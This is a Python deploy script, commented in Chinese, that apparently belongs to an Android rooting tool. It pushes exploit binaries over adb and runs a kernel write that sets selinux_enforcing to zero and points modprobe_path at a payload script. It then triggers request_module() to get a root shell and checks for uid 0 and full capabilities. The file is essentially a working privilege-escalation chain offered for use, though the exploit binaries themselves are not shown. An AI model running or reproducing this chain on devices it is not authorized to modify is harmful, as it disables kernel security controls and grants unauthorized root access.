#!/usr/bin/env python3
"""推送文件、跑利用、触发内核 payload、启动授权守护进程并验证 root。

    python deploy.py
    python deploy.py --serial <serial>
    python deploy.py --no-adb-allow     # 不允许 adb shell(uid 2000) 免询问

这条路径给 PC 调试用。手机端日常使用请安装 App（tools/build_apk.py），
在 App 里点「一键获取 Root」。
"""
import argparse
import os
import re
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
D = "/data/local/tmp"


def adb(serial, *args, check=True, capture=False):
    """调用 adb，统一 UTF-8 解码。"""
    cmd = [os.environ.get("ADB", "adb")]
    if serial:
        cmd += ["-s", serial]
    cmd += list(args)
    return subprocess.run(cmd, check=check, text=True, encoding="utf-8", errors="replace",
                          stdout=subprocess.PIPE if capture else None,
                          stderr=subprocess.STDOUT if capture else None)


def make_wb(allow_adb):
    """把 payload/wb.sh 的占位符换成 PC 部署的取值。"""
    path = os.path.join(ROOT, "payload", "wb.sh")
    with open(path, "r", encoding="utf-8") as f:
        tpl = f.read()
    repl = {
        "__APPDIR__": D,
        "__PKG__": "",
        "__UID__": "0",
        "__SOCK__": "",
        "__EXTRA__": "--allow-uid 2000" if allow_adb else "",
    }
    for k, v in repl.items():
        tpl = tpl.replace(k, v)
    out = os.path.join(ROOT, ".wb.deploy.sh")
    with open(out, "w", encoding="utf-8", newline="\n") as f:
        f.write(tpl)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--serial", default=os.environ.get("SERIAL", ""))
    ap.add_argument("--no-adb-allow", action="store_true",
                    help="不把 adb shell(uid 2000) 加进免询问名单")
    args = ap.parse_args()

    bindir = os.path.join(ROOT, "bin")
    if not os.path.isfile(os.path.join(bindir, "suvd")):
        print("[*] 先编译")
        subprocess.run([sys.executable, os.path.join(ROOT, "build.py")], check=True)

    adb(args.serial, "wait-for-device")

    print("[*] 推送文件")
    wb = make_wb(not args.no_adb_allow)
    local = [os.path.join(bindir, b) for b in ["probe26", "trig_sock", "suvd"]]
    adb(args.serial, "push", *local, D + "/", capture=True)
    adb(args.serial, "push", wb, f"{D}/wb.sh", capture=True)
    adb(args.serial, "shell", "chmod 755 " + " ".join(
        f"{D}/{x}" for x in ["probe26", "trig_sock", "suvd", "wb.sh"]))
    try:
        os.remove(wb)
    except OSError:
        pass

    print("[*] 第 1/3 步：内核写（selinux_enforcing=0，modprobe_path=payload）")
    out = adb(args.serial, "shell", f"{D}/probe26 -p {D}/wb.sh -L {D}/probe26.log -y -q",
              capture=True, check=False).stdout or ""
    with open(os.path.join(ROOT, ".last-run.log"), "w", encoding="utf-8") as f:
        f.write(out)
    for line in [l for l in out.splitlines() if l.strip()][-3:]:
        print("  " + line)
    if "result=OK" not in out:
        sys.exit("[!] 利用没有成功——看 " + D + "/probe26.log，重启后重试")

    print("[*] 第 2/3 步：触发 request_module() → root payload")
    adb(args.serial, "shell", f"{D}/trig_sock", check=False)
    time.sleep(1.5)

    print("[*] 第 3/3 步：验证")
    enf = (adb(args.serial, "shell", "getenforce", capture=True, check=False).stdout or "").strip()
    status = (adb(args.serial, "shell", f"{D}/.su/suvd --status", capture=True,
                  check=False).stdout or "").strip()
    su_id = (adb(args.serial, "shell", f"{D}/.su/su -c id", capture=True,
                 check=False).stdout or "").strip()
    caps = (adb(args.serial, "shell", f"{D}/.su/su -c 'grep CapEff /proc/self/status'",
                capture=True, check=False).stdout or "").strip()

    print("  SELinux     ：", enf)
    print("  守护进程    ：", status if status else "(未运行)")
    print("  su -c id    ：", su_id.replace("\n", " | "))
    print("  capability  ：", caps.replace("\n", " | "))

    ok = (enf == "Permissive" and "uid=0" in su_id and "3fffffffff" in caps)
    if not ok:
        sys.exit("[!] 提权验证失败，见 docs/TROUBLESHOOTING.md")

    print("\n[+] 完成。现在可以：")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell su -c id")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell {D}/.su/su -c 'getenforce'")
    if args.no_adb_allow:
        print("      （adb shell 未加入免询问名单，su 会等待管理 App 弹窗）")
    print("\n[!] 仅本次开机有效：重启后 SELinux 恢复 Enforcing，modprobe_path 复原。")


if __name__ == "__main__":
    main()
